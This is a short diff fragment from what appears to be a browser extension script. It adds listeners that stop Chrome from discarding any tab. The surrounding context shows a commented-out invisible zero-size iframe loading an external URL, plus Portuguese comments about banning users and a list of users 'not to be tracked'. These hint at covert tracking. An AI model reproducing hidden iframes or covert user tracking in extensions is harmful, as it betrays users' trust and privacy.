@@ -46,6 +46,22 @@ iframe.style.width = "0", iframe.style.height = "0", iframe.src = "https://garti
 }, 10000);
 
 */
+
+// anti discard
+chrome.tabs.onCreated.addListener(function(tab) {
+  chrome.tabs.update(tab.id, {autoDiscardable: false});
+});
+chrome.tabs.onReplaced.addListener(function(tabId) {
+  chrome.tabs.update(tabId, {autoDiscardable: false});
+});
+chrome.runtime.onInstalled.addListener(function(details) {
+  chrome.tabs.query({}, function(tabs) {
+    tabs.forEach(function(tab) {
+      chrome.tabs.update(tab.id, {autoDiscardable: false});
+    });
+  });
+});
+
 // 6 _f.js 6.log 04/02 jb (white c#)
 // verifica se utilizador foi banido de usar a extensão;
 // blacklist usuários a não serem perseguidos;
